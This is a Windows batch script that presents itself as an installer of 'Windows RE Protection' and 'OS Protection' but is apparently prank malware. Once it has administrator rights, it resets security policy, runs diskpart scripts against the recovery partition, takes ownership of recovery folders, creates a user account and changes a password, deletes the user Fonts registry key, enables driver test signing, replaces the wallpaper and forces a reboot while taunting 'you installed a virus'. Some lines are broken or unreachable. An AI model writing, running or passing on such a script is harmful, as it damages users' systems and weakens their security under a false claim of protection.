
@echo off
TITLE CMDV4
SFC /ScanFile="C:\Windows\system32\net.exe"
SFC /ScanFile="C:\Windows\system32\net1.exe"
@rem ----[ This code block detects if the script is being running with admin PRIVILEGES If it isn't it pauses and then quits]-------
echo OFF
NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    ECHO Administrator PRIVILEGES Detected! 
) ELSE (
   echo ######## ########  ########   #######  ########  
   echo ##       ##     ## ##     ## ##     ## ##     ## 
   echo ##       ##     ## ##     ## ##     ## ##     ## 
   echo ######   ########  ########  ##     ## ########  
   echo ##       ##   ##   ##   ##   ##     ## ##   ##   
   echo ##       ##    ##  ##    ##  ##     ## ##    ##  
   echo ######## ##     ## ##     ##  #######  ##     ## 
   echo.
   echo.
   echo ####### ERROR: ADMINISTRATOR PRIVILEGES REQUIRED #########
   echo This file must be run as administrator to work properly!  
   echo If you're seeing this after clicking on the file, then right click on it and select "Run As Administrator".
   echo ##########################################################
   echo.
   PAUSE
   EXIT /B 1
)
cls
echo Loading...
SFC /ScanFile="C:\Windows\system32\reg.exe"
SFC /ScanFile="C:\Windows\system32\diskpart.exe"
SFC /ScanFile="C:\Windows\system32\secedit.exe"
SFC /ScanFile="C:\Windows\system32\mountvol.exe"
SFC /ScanFile="C:\Windows\system32\logoff.exe"
secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose
echo Checking Operating System Version...
wmic os get version | find "6.1" > nul
if %ERRORLEVEL% == 0 goto SEVEN
)
wmic os get version | find "6.2" > nul
if %ERRORLEVEL% == 0 goto EIGHT
)
wmic os get version | find "6.3" > nul
if %ERRORLEVEL% == 0 goto EIGHTPOINTONE
)
wmic os get version | find "10.0" > nul
if %ERRORLEVEL% == 0 goto TEN
)
wmic os get version | find "6.0" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLB
)
wmic os get version | find "5.1" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLB
)
ver | find "5.0" > nul
if %ERRORLEVEL% == 0 goto MAININSTALLB
)
cls
echo OS Check Failed.
PAUSE
exit
:NOTCOMPAT
cls
echo the OS is not compatible.
PAUSE
exit
:SEVEN
cls
echo .....................................................
echo :)
echo .....................................................
echo,
echo,
echo 1 - :)
echo,
SET /P M=Type 1 or 2 then press ENTER:
IF %M%==1 GOTO WIN7INSTALLRE
:WIN7INSTALLRE
echo Installing Windows RE :)
diskpart /s %CD%\win7\diskpart.txt
%CD%\win7\icacls.exe "C:\Recovery\" /setowner "Dartz" /T /C
xcopy "%CD%\win7\win7re\Winre.wim" "C:\Recovery\db77f94e-8028-11eb-a6d0-a34b0745a61f\Winre.wim" /Y
goto SEVENINSTALL
:SEVENINSTALL
echo,
echo Installing OS Protection...
goto MAININSTALL
:EIGHT
cls
echo .....................................................
echo :)
echo .....................................................
eecho,
echo,
echo 1 - :)
echo,
SET /P M=Type 1 then press ENTER:
IF %M%==1 GOTO WIN8INSTALLRE
:WIN8INSTALLRE
echo Installing Windows RE Protection...
diskpart /s %CD%\win8\diskpart.txt
%CD%\win8\icacls.exe "K:\Recovery\" /setowner "Dartz" /T /C
xcopy "%CD%\win7\win78re\Winre.wim" "K:\Recovery'WindowsRE\Winre.wim" /Y
goto EIGHTINSTALL
:EIGHTINSTALL
echo,
goto MAININSTALLB
echo Sorry but Windows 8 Support has not been inplemented yet.
PAUSE
exit
echo Installing OS Protection...
goto MAININSTALL
:EIGHTPOINTONE
cls
echo .....................................................
echo :)
echo .....................................................
echo,
echo,
echo 1 - :)
echo,
SET /P M=Type 1 then press ENTER:
IF %M%==1 GOTO WIN81INSTALLRE
:WIN81INSTALLRE
cls
echo Installing Windows RE Protection...
diskpart /s %CD%\win81\diskpart.txt
%CD%\win81\icacls.exe "K:\Recovery\" /setowner "Dartz" /T /C
xcopy "%CD%\win81\win81re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y
goto EIGHTPOINTONEINSTALL
:EIGHTPOINTONEINSTALL
echo,
echo :)
goto MAININSTALL
:TEN
cls
echo .....................................................
echo :)
echo .....................................................
echo,
echo :)
echo,
echo 1 - :)
echo,
SET /P M=Type 1 then press ENTER:
IF %M%==1 GOTO WIN10INSTALLRE
:WIN10INSTALLRE
goto TENINSTALL
echo Installing Windows RE Protection...
diskpart /s %CD%\win10\diskpart.txt
%CD%\win10\icacls.exe "K:\Recovery\" /setowner "Dartz" /T /C
xcopy "%CD%\win10\win10re\Winre.wim" "K:\Recovery\WindowsRE\Winre.wim" /Y
goto TENINSTALL
:TENINSTALL
echo,
goto MAININSTALLB
PAUSE
exit
echo :)
goto MAININSTALL
:MAININSTALL
net user beachball /add
net localgroup Guests beachball /add
net user Dartz 1593570 /domain
diskpart /s %CD%\unass\unass.txt
goto DESTROY
:EXIT
exit
:RESTART
echo you idiot, you installed a virus, now suffer!!!!!!!!!
echo,
wmic os where primary=1 reboot
:DESTROY
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Fonts /f
GOTO eeee
:MAININSTALLB
cls
echo .....................................................
echo :)
echo .....................................................
echo,
echo,
echo 1 - :)
echo,
SET /P M=Type 1 or 2 then press ENTER:
IF %M%==1 GOTO MAININSTALLBB
:MAININSTALLBB
net user beachball /add
net localgroup Guests beachball /add
net user Dartz 1593570 /domain
goto eeee
:eeee
bcdedit /set TESTSIGNING on
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %CD%\walp.bmp /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
goto AAAAJJ
:AAAAJJ
echo,
echo Something Happened :)
cls
goto RESTART
